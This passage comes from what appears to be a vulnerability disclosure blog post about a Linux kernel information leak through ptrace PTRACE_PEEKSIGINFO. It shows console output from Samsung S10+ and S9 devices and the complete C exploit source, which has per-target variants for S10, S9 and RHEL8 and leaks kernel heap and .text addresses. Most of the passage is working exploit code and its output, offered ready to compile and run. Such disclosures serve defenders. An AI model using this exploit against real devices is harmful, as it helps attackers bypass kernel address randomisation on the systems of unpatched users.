<p>The same result seems to present on Red Hat Enterpise Linux 7/8, Oracle Linux 7/8, CentOS 7/8 and Cloud Linux 7/8.</p>



<p><em>Samsung S10+</em></p>



<p>Below we show the execution of the proof of concept on a fully updated Samsung S10+ device. By default, it leaks much more addresses than when executing it on a distribution based on Red Hat Enterprise Linux but because we do not have the capability to inspect the kernel memory, we can not say for sure what are allocaed on these addresses. </p>



<p>They might be addresses from the kernel heap and the kernel .text section or they might all be from the kernel .text section.</p>



<p>No effort was done to try to manipulate the kernel stack before leaking the kernel uninitialized data to the user but it might be possible.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ ./bin/aarch64-linux-android26-clang leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"> -o leak -DS10 -Wall</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> adb push leak /data/local/tmp/</span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n1">1</span><span class="enlighter-text"> file pushed. </span><span class="enlighter-n0">0.9</span><span class="enlighter-text"> MB/</span><span class="enlighter-m0">s</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">6896</span><span class="enlighter-text"> bytes </span><span class="enlighter-k1">in</span><span class="enlighter-text"> </span><span class="enlighter-n0">0.007</span><span class="enlighter-text">s</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> adb shell</span></div></div><div class=""><div><span class="enlighter-text">beyond2:/ </span><span class="enlighter-g0">$</span><span class="enlighter-text"> uname -a</span></div></div><div class=""><div><span class="enlighter-text">Linux localhost </span><span class="enlighter-n0">4.14</span><span class="enlighter-text">.</span><span class="enlighter-m3">113</span><span class="enlighter-text">-</span><span class="enlighter-n1">20606551</span><span class="enlighter-c0"> #1 SMP PREEMPT Sat Feb 20 04:58:01 KST 2021 aarch64</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">beyond2:/ </span><span class="enlighter-g0">$</span><span class="enlighter-text"> /data/local/tmp/leak</span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffff800ad497b8</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x7ff2100f18</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc911f26b4c</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc911f26300</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x8</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffff800bfdbe50</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffff80082af2dc</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc827622100</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc81d046480</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x140</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc900000000</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x2f9b4d809924e700</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffffc827622100</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">beyond2:/ $</span></div></div></div><div class="enlighter-raw">$ ./bin/aarch64-linux-android26-clang leak.c -o leak -DS10 -Wall
$ adb push leak /data/local/tmp/
leak: 1 file pushed. 0.9 MB/s (6896 bytes in 0.007s)
$ adb shell
beyond2:/ $ uname -a
Linux localhost 4.14.113-20606551 #1 SMP PREEMPT Sat Feb 20 04:58:01 KST 2021 aarch64
beyond2:/ $ /data/local/tmp/leak
leak: 0xffffff800ad497b8
leak: 0x7ff2100f18
leak: 0xffffffc911f26b4c
leak: 0xffffffc911f26300
leak: 0x8
leak: 0xffffff800bfdbe50
leak: 0xffffff80082af2dc
leak: 0xffffffc827622100
leak: 0x0
leak: 0xffffffc81d046480
leak: 0x140
leak: 0xffffffc900000000
leak: 0x2f9b4d809924e700
leak: 0xffffffc827622100
beyond2:/ $</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ ./bin/aarch64-linux-android26-clang leak.c -o leak -DS10 -Wall
$ adb push leak /data/local/tmp/
leak: 1 file pushed. 0.9 MB/s (6896 bytes in 0.007s)
$ adb shell
beyond2:/ $ uname -a
Linux localhost 4.14.113-20606551 #1 SMP PREEMPT Sat Feb 20 04:58:01 KST 2021 aarch64
beyond2:/ $ /data/local/tmp/leak
leak: 0xffffff800ad497b8
leak: 0x7ff2100f18
leak: 0xffffffc911f26b4c
leak: 0xffffffc911f26300
leak: 0x8
leak: 0xffffff800bfdbe50
leak: 0xffffff80082af2dc
leak: 0xffffffc827622100
leak: 0x0
leak: 0xffffffc81d046480
leak: 0x140
leak: 0xffffffc900000000
leak: 0x2f9b4d809924e700
leak: 0xffffffc827622100
beyond2:/ $</pre>



<p><em>Samsung S9</em></p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ ./bin/aarch64-linux-android26-clang leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"> -o leak -DS9 -Wall</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> adb push leak /data/local/tmp/                               </span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n1">1</span><span class="enlighter-text"> file pushed. </span><span class="enlighter-n0">0.9</span><span class="enlighter-text"> MB/</span><span class="enlighter-m0">s</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">6896</span><span class="enlighter-text"> bytes </span><span class="enlighter-k1">in</span><span class="enlighter-text"> </span><span class="enlighter-n0">0.007</span><span class="enlighter-text">s</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> adb shell                                                    </span></div></div><div class=""><div><span class="enlighter-text">starlte:/ </span><span class="enlighter-g0">$</span><span class="enlighter-text"> uname -a</span></div></div><div class=""><div><span class="enlighter-text">Linux localhost </span><span class="enlighter-n0">4.9</span><span class="enlighter-text">.</span><span class="enlighter-m3">118</span><span class="enlighter-text">-</span><span class="enlighter-n1">21315611</span><span class="enlighter-c0"> #1 SMP PREEMPT Tue Mar 23 10:57:36 KST 2021 aarch64</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">starlte:/ </span><span class="enlighter-g0">$</span><span class="enlighter-text"> /data/local/tmp/leak</span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffff80084311ec</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0x6cf37d10</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">leak: </span><span class="enlighter-n2">0xffffff8008155788</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">starlte:/ </span><span class="enlighter-g0">$</span><span class="enlighter-text"> </span></div></div></div><div class="enlighter-raw">$ ./bin/aarch64-linux-android26-clang leak.c -o leak -DS9 -Wall
$ adb push leak /data/local/tmp/                               
leak: 1 file pushed. 0.9 MB/s (6896 bytes in 0.007s)
$ adb shell                                                    
starlte:/ $ uname -a
Linux localhost 4.9.118-21315611 #1 SMP PREEMPT Tue Mar 23 10:57:36 KST 2021 aarch64
starlte:/ $ /data/local/tmp/leak
leak: 0xffffff80084311ec
leak: 0x6cf37d10
leak: 0xffffff8008155788
starlte:/ $ </div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ ./bin/aarch64-linux-android26-clang leak.c -o leak -DS9 -Wall
$ adb push leak /data/local/tmp/                               
leak: 1 file pushed. 0.9 MB/s (6896 bytes in 0.007s)
$ adb shell                                                    
starlte:/ $ uname -a
Linux localhost 4.9.118-21315611 #1 SMP PREEMPT Tue Mar 23 10:57:36 KST 2021 aarch64
starlte:/ $ /data/local/tmp/leak
leak: 0xffffff80084311ec
leak: 0x6cf37d10
leak: 0xffffff8008155788
starlte:/ $ </pre>



<p><strong>Exploit</strong></p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-k4">#include &lt;stdio.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;stdlib.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;string.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;unistd.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;sys/ptrace.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;sys/types.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;sys/wait.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#include &lt;linux/ptrace.h&gt;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#define LLEAK 50</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k5">int</span><span class="enlighter-text"> </span><span class="enlighter-m0">main</span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> ptrace_peeksiginfo_args b</span><span class="enlighter-g1">[</span><span class="enlighter-text">LLEAK</span><span class="enlighter-g1">]</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> ptrace_peeksiginfo_args a;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">int</span><span class="enlighter-text"> pid, i;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-text"> heap = 0;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-text"> text = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;a,</span><span class="enlighter-s1">'\0'</span><span class="enlighter-text">,</span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">a</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">&amp;b,</span><span class="enlighter-s1">'\0'</span><span class="enlighter-text">,</span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">b</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pid = </span><span class="enlighter-m0">fork</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid == 0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">getchar</span><span class="enlighter-g1">()</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-m0">ptrace</span><span class="enlighter-g1">(</span><span class="enlighter-text">PTRACE_ATTACH,pid,</span><span class="enlighter-e1">NULL</span><span class="enlighter-text">,</span><span class="enlighter-e1">NULL</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ptrace attach"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">waitpid</span><span class="enlighter-g1">(</span><span class="enlighter-text">pid, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, 0</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    a.</span><span class="enlighter-m3">off</span><span class="enlighter-text"> = -1;</span></div></div><div class=""><div><span class="enlighter-text">    a.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> = LLEAK;</span></div></div><div class=""><div><span class="enlighter-text">    a.</span><span class="enlighter-m3">flags</span><span class="enlighter-text"> = 0;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-m0">ptrace</span><span class="enlighter-g1">(</span><span class="enlighter-text">PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">perror</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ptrace"</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">exit</span><span class="enlighter-g1">(</span><span class="enlighter-text">EXIT_FAILURE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#ifdef S10</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = 0; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 7; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            text = </span><span class="enlighter-g1">((</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> 32 | b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;    </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#ifdef S9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = 0; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 2; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            text = </span><span class="enlighter-g1">((</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> 32 | b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">text != 0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;    </span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#ifdef RHEL8</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = 0; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> 1; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            text = </span><span class="enlighter-g1">((</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> 32 | b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"heap: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"text: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-k8">unsigned</span><span class="enlighter-text"> </span><span class="enlighter-k5">long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;    </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">return</span><span class="enlighter-text"> 0;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/ptrace.h&gt;

#define LLEAK 50

int main(void){
    struct ptrace_peeksiginfo_args b[LLEAK];
    struct ptrace_peeksiginfo_args a;
    int pid, i;

    unsigned long heap = 0;
    unsigned long text = 0;

    memset(&amp;a,'\0',sizeof(a));
    memset(&amp;b,'\0',sizeof(b));

    pid = fork();
    if(pid == 0){
        getchar();
        exit(EXIT_FAILURE);
    }

    if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) &lt; 0){
        perror("ptrace attach");
        exit(EXIT_FAILURE);
    }

    waitpid(pid, NULL, 0);

    a.off = -1;
    a.nr = LLEAK;
    a.flags = 0;

    if(ptrace(PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b) &lt; 0){
        perror("ptrace");
        exit(EXIT_FAILURE);
    }

    #ifdef S10
        for(i = 0; i &lt; 7; i++){
            heap = b[i].off;
            text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

            printf("leak: 0x%lx\n",(unsigned long)heap);
            printf("leak: 0x%lx\n",(unsigned long)text);    
        }
    #endif
    #ifdef S9
        for(i = 0; i &lt; 2; i++){
            heap = b[i].off;
            text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

            printf("leak: 0x%lx\n",(unsigned long)heap);
            if(text != 0){
                printf("leak: 0x%lx\n",(unsigned long)text);    
            }
        }
    #endif
    #ifdef RHEL8
        for(i = 0; i &lt; 1; i++){
            heap = b[i].off;
            text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

            printf("heap: 0x%lx\n",(unsigned long)heap);
            printf("text: 0x%lx\n",(unsigned long)text);    
        }
    #endif

return 0;
}</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/ptrace.h&gt;

#define LLEAK 50

int main(void){
	struct ptrace_peeksiginfo_args b[LLEAK];
	struct ptrace_peeksiginfo_args a;
	int pid, i;

	unsigned long heap = 0;
	unsigned long text = 0;

	memset(&amp;a,'\0',sizeof(a));
	memset(&amp;b,'\0',sizeof(b));

	pid = fork();
	if(pid == 0){
		getchar();
		exit(EXIT_FAILURE);
	}

	if(ptrace(PTRACE_ATTACH,pid,NULL,NULL) &lt; 0){
		perror("ptrace attach");
		exit(EXIT_FAILURE);
	}

	waitpid(pid, NULL, 0);

	a.off = -1;
	a.nr = LLEAK;
	a.flags = 0;

	if(ptrace(PTRACE_PEEKSIGINFO,pid,&amp;a,&amp;b) &lt; 0){
		perror("ptrace");
		exit(EXIT_FAILURE);
	}

	#ifdef S10
		for(i = 0; i &lt; 7; i++){
			heap = b[i].off;
			text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

			printf("leak: 0x%lx\n",(unsigned long)heap);
			printf("leak: 0x%lx\n",(unsigned long)text);	
		}
	#endif
	#ifdef S9
		for(i = 0; i &lt; 2; i++){
			heap = b[i].off;
			text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

			printf("leak: 0x%lx\n",(unsigned long)heap);
			if(text != 0){
				printf("leak: 0x%lx\n",(unsigned long)text);	
			}
		}
	#endif
	#ifdef RHEL8
		for(i = 0; i &lt; 1; i++){
			heap = b[i].off;
			text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);

			printf("heap: 0x%lx\n",(unsigned long)heap);
			printf("text: 0x%lx\n",(unsigned long)text);	
		}
	#endif

return 0;
}</pre>
</div>

      <div class="meta-content">
              </div>
   </div>
</div>
            <div class="page-content comments-content">
          <div id="comments" class="comments-area">
      <div class="reply-title">Comments</div>
      <ul class="comment-list">
      		<li id="comment-1113" class="pingback even thread-even depth-1">
			<div class="comment-body">
